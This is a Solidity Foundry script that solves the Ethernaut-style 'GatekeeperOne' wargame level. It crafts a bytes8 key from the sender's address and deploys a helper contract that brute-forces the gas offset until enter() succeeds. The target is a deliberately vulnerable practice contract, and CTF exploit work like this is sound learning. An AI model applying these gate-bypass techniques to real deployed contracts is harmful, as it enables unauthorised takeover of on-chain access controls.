// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";             

contract GatekeeperOneScript is Script {

    GatekeeperOne internal gatekeeperOne;

    constructor() {
        gatekeeperOne = GatekeeperOne(vm.envAddress("GATEKEEPER_INSTANCE"));
    }

    function run() public {
        uint256 pk = vm.envUint("PK");
        bytes8 key = bytes8(
            bytes.concat(
                bytes2(uint16(1)), // XXXXXXXXXXXXXXX1
                bytes4(uint32(0)), // 00000000000000000000000000000000
                bytes2(uint16(uint160(vm.addr(pk)))) // last 16 bits of tx.origin
            )
        );
        console.log("key: ", uint64(key));

        // or:
        // key = bytes8(uint64(uint160(vm.addr(pk))) & 0xFFFFFFFF0000FFFF);

        vm.startBroadcast(pk);
        //gatekeeperOne = new GatekeeperOne();
        new ElevatorExecutor(
            gatekeeperOne, 
            key
        );
        console.log("Owner: ", gatekeeperOne.entrant());
        vm.stopBroadcast();
    }

    // forge script script/gatekeeperOne.s.sol:GatekeeperOneScript --broadcast
}

contract ElevatorExecutor {
    constructor(GatekeeperOne gatekeeperOne, bytes8 key) {
        for (uint256 i; true; i++)
            try gatekeeperOne.enter{gas: 8191*3 + i}(key) {
                break;
            } catch {}
    }
}
